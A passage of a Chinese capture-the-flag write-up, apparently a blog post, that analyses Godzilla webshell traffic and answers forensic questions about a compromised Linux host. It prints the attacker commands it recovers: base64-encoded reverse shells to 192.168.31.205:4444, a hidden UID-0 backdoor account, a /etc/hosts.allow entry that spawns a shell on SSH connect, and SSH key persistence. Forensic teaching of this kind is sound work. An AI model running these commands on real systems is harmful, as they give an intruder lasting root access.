+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470213931-20241009183656-j3mljkh.png" alt="QQ_1728470213931" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470213931-20241009183656-j3mljkh.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470213931-20241009183656-j3mljkh.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470213931-20241009183656-j3mljkh.png?size=large 2x" data-title="QQ_1728470213931" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>解密和解压后看到执行结果</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834017763-20241002095345-qp18rfn.png" alt="QQ_1727834017763" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834017763-20241002095345-qp18rfn.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834017763-20241002095345-qp18rfn.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834017763-20241002095345-qp18rfn.png?size=large 2x" data-title="QQ_1727834017763" style="--width: 1614px;--aspect-ratio: 1614 / 966;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>得到参数名是Rec106e_config，当然从代码里也可以看出</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834140703-20241002095542-yptqt98.png" alt="QQ_1727834140703" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834140703-20241002095542-yptqt98.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834140703-20241002095542-yptqt98.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834140703-20241002095542-yptqt98.png?size=large 2x" data-title="QQ_1727834140703" style="--width: 2934px;--aspect-ratio: 2934 / 498;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{Rec106e_config}</p>
+<h2 id="6黑客留下后门的反连的ip和port是什么flagipport" class="heading-element"><span>6、黑客留下后门的反连的IP和PORT是什么？（flag{IP,PORT})</span>
+  <a href="#6%e9%bb%91%e5%ae%a2%e7%95%99%e4%b8%8b%e5%90%8e%e9%97%a8%e7%9a%84%e5%8f%8d%e8%bf%9e%e7%9a%84ip%e5%92%8cport%e6%98%af%e4%bb%80%e4%b9%88flagipport" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>这条数据没有回显示，很可疑，解密后发现是反弹shell</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470227052-20241009183709-o8xy007.png" alt="QQ_1728470227052" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470227052-20241009183709-o8xy007.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470227052-20241009183709-o8xy007.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728470227052-20241009183709-o8xy007.png?size=large 2x" data-title="QQ_1728470227052" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469323986-20241009182208-vvjht7e.png" alt="QQ_1728469323986" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469323986-20241009182208-vvjht7e.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469323986-20241009182208-vvjht7e.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469323986-20241009182208-vvjht7e.png?size=large 2x" data-title="QQ_1728469323986" style="--width: 1682px;--aspect-ratio: 1682 / 1110;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="n">L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguMzEuMjA1LzQ0NDQgMD4mMQ</span><span class="o">==|</span><span class="n">base64</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="o">|</span><span class="n">bash</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469337955-20241009182219-5zx75cu.png" alt="QQ_1728469337955" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469337955-20241009182219-5zx75cu.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469337955-20241009182219-5zx75cu.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469337955-20241009182219-5zx75cu.png?size=large 2x" data-title="QQ_1728469337955" style="--width: 2168px;--aspect-ratio: 2168 / 636;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{192.168.31.205,4444}</p>
+<h2 id="7黑客通过后门反连执行的第一条命令是什么" class="heading-element"><span>7、黑客通过后门反连执行的第一条命令是什么？</span>
+  <a href="#7%e9%bb%91%e5%ae%a2%e9%80%9a%e8%bf%87%e5%90%8e%e9%97%a8%e5%8f%8d%e8%bf%9e%e6%89%a7%e8%a1%8c%e7%9a%84%e7%ac%ac%e4%b8%80%e6%9d%a1%e5%91%bd%e4%bb%a4%e6%98%af%e4%bb%80%e4%b9%88" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>后续直接过滤这个ip和port的流量即可</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469444848-20241009182406-ve77br8.png" alt="QQ_1728469444848" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469444848-20241009182406-ve77br8.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469444848-20241009182406-ve77br8.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469444848-20241009182406-ve77br8.png?size=large 2x" data-title="QQ_1728469444848" style="--width: 3840px;--aspect-ratio: 3840 / 1996;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469414340-20241009182336-1vq8i2z.png" alt="QQ_1728469414340" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469414340-20241009182336-1vq8i2z.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469414340-20241009182336-1vq8i2z.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469414340-20241009182336-1vq8i2z.png?size=large 2x" data-title="QQ_1728469414340" style="--width: 2152px;--aspect-ratio: 2152 / 1686;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{ls}</p>
+<h2 id="8黑客新增的后门用户名密码是什么提交flagusernamepassword" class="heading-element"><span>8、黑客新增的后门用户名密码是什么？（提交flag{username,password}）</span>
+  <a href="#8%e9%bb%91%e5%ae%a2%e6%96%b0%e5%a2%9e%e7%9a%84%e5%90%8e%e9%97%a8%e7%94%a8%e6%88%b7%e5%90%8d%e5%af%86%e7%a0%81%e6%98%af%e4%bb%80%e4%b9%88%e6%8f%90%e4%ba%a4flagusernamepassword" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>新增了一个x用户且密码是Xj@666.然后添加到root组</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="n">dXNlcmFkZCAtcCBgb3BlbnNzbCBwYXNzd2QgLTEgLXNhbHQgJ3NhbHQnIFhqQDY2Ni5gIHggLW8gLXUgMCAtZyByb290IC1HIHJvb3QgLXMgL2Jpbi9iYXNoIA</span><span class="o">==|</span><span class="n">base64</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="o">|</span><span class="n">bash</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">useradd</span><span class="w"> </span><span class="o">-</span><span class="n">p</span><span class="w"> </span><span class="err">`</span><span class="n">openssl</span><span class="w"> </span><span class="n">passwd</span><span class="w"> </span><span class="o">-</span><span class="n">1</span><span class="w"> </span><span class="o">-</span><span class="n">salt</span><span class="w"> </span><span class="err">&#39;</span><span class="n">salt</span><span class="err">&#39;</span><span class="w"> </span><span class="n">Xj</span><span class="nd">@666.</span><span class="err">`</span><span class="w"> </span><span class="n">x</span><span class="w"> </span><span class="o">-</span><span class="n">o</span><span class="w"> </span><span class="o">-</span><span class="n">u</span><span class="w"> </span><span class="n">0</span><span class="w"> </span><span class="o">-</span><span class="n">g</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">G</span><span class="w"> </span><span class="n">root</span><span class="w"> </span><span class="o">-</span><span class="n">s</span><span class="w"> </span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">bash</span><span class="w"> </span></span></span></code></pre></td></tr></table>
+</div>
+</div><p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834384317-20241002095947-ivdat8v.png" alt="QQ_1727834384317" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834384317-20241002095947-ivdat8v.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834384317-20241002095947-ivdat8v.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834384317-20241002095947-ivdat8v.png?size=large 2x" data-title="QQ_1727834384317" style="--width: 1670px;--aspect-ratio: 1670 / 224;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{x,Xj@666.}</p>
+<h2 id="9黑客新增的后门文件是什么提交完整路径" class="heading-element"><span>9、黑客新增的后门文件是什么？（提交完整路径）</span>
+  <a href="#9%e9%bb%91%e5%ae%a2%e6%96%b0%e5%a2%9e%e7%9a%84%e5%90%8e%e9%97%a8%e6%96%87%e4%bb%b6%e6%98%af%e4%bb%80%e4%b9%88%e6%8f%90%e4%ba%a4%e5%ae%8c%e6%95%b4%e8%b7%af%e5%be%84" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>后续就是一些ssh的流量了，猜测可能是ssh登录后操作的</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469506434-20241009182508-xvrmv2h.png" alt="QQ_1728469506434" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469506434-20241009182508-xvrmv2h.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469506434-20241009182508-xvrmv2h.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1728469506434-20241009182508-xvrmv2h.png?size=large 2x" data-title="QQ_1728469506434" style="--width: 3312px;--aspect-ratio: 3312 / 1084;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>出题命令：</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">echo</span><span class="w"> </span><span class="n">ZWNobyAnQUxMOiBBTEw6IHNwYXduIChiYXNoIC1jICIvYmluL2Jhc2ggLWkgPiYgL2Rldi90Y3AvMTkyLjE2OC4zMS4yMDAvNDQ0NCAwPiYxIikgJiA6YWxsb3cnID4gL2V0Yy9ob3N0cy5hbGxvdw</span><span class="o">==|</span><span class="n">base64</span><span class="w"> </span><span class="o">-</span><span class="n">d</span><span class="o">|</span><span class="n">bash</span></span></span></code></pre></td></tr></table>
+</div>
+</div><p>上机一些基础排查后发现后门被写到了/etc/hosts.allow文件，当有主机ssh连接时，就会自动反弹shell到黑客主机的4444端口</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834656103-20241002100418-lgof681.png" alt="QQ_1727834656103" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834656103-20241002100418-lgof681.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834656103-20241002100418-lgof681.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834656103-20241002100418-lgof681.png?size=large 2x" data-title="QQ_1727834656103" style="--width: 1288px;--aspect-ratio: 1288 / 122;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<p>flag{/etc/hosts.allow}</p>
+<h2 id="10黑客的后门公钥是什么提交公钥的md5值" class="heading-element"><span>10、黑客的后门公钥是什么？（提交公钥的md5值）</span>
+  <a href="#10%e9%bb%91%e5%ae%a2%e7%9a%84%e5%90%8e%e9%97%a8%e5%85%ac%e9%92%a5%e6%98%af%e4%bb%80%e4%b9%88%e6%8f%90%e4%ba%a4%e5%85%ac%e9%92%a5%e7%9a%84md5%e5%80%bc" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>sshd_config 指定其他免认证文件</p>
+<p>这里首先就要排查ssh配置文件，在41行发现还有一个可以免认证的文件</p>
+<p><img loading="lazy" src="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834803914-20241002100645-xp909jd.png" alt="QQ_1727834803914" srcset="/posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834803914-20241002100645-xp909jd.png?size=small, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834803914-20241002100645-xp909jd.png?size=medium 1.5x, /posts/%E5%93%A5%E6%96%AF%E6%8B%89ekp%E7%89%88%E6%9C%AC%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/images/QQ_1727834803914-20241002100645-xp909jd.png?size=large 2x" data-title="QQ_1727834803914" style="--width: 1138px;--aspect-ratio: 1138 / 156;background: url(/images/loading.min.svg) no-repeat center;" onload="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}this.dataset.lazyloaded='';" onerror="this.title=this.dataset.title;for(const i of ['style', 'data-title','onerror','onload']){this.removeAttribute(i);}"/>​</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-java" data-lang="java"><span class="line"><span class="cl"><span class="n">mkdir</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="p">.</span><span class="na">bash_h1story</span><span class="o">/</span><span class="w">
+</span></span></span><span class="line"><span class="cl"><span class="w"></span><span class="n">echo</span><span class="w"> </span><span class="n">c3NoLXJzYSBBQUFBQjNOemFDMXljMkVBQUFBREFRQUJBQUFCZ1FEUE5LUDNRTCtpMXNhZmRzVTZaYjJNdW9CalpZcmVBRGp3aGJQM2R6WnBqd3g4YUM3WDFrOXNiOElFS1NqdnNXeGJiNG5DN3Ivd3pIS0hvMGJkbndkTTZSaXNqbmlvYjYrMGM0SW1CemtzeHZuUjNsSmpRZTVIdyt3aTQreW5BL0QzVTE5T2F6UnhjYTVJMUw2T05zcFNBYTNzNHN3MlFveGJ1QlZGZWwrSUtCemVicDhLN1ZCM0tyM1pscnk1TlRkNTJJbm4zNDd6WldmYjU2b2x4UmFIVEo2SVhBSkxlRm1HVDZSMm5EdWwybFk4SFdTMkQ1azhsREM5b05ld1RqdEZLelBWaTlydER6R0h4RGMxK2szZ0tFMlFrS1VqQkVZZmVLbVUrTjVHbVRUM3RJWWZySlNmV2Z4d0RyQ3Z2aHFuZjJ3WlFZdFpDTmY0OEMvb3BIOEVoUkJRckgvWDk0ZHJYK2VYSk9tb3pRektKZmRpZFFzaFJ3U0tEZmY2dzFnWWs9IHhpYW9sZUB4aWFvbGVkZU1hY0Jvb2stUHJvLmxvY2Fs</span><span class="o">|</span><span class="n">base64</span><span class="w"> 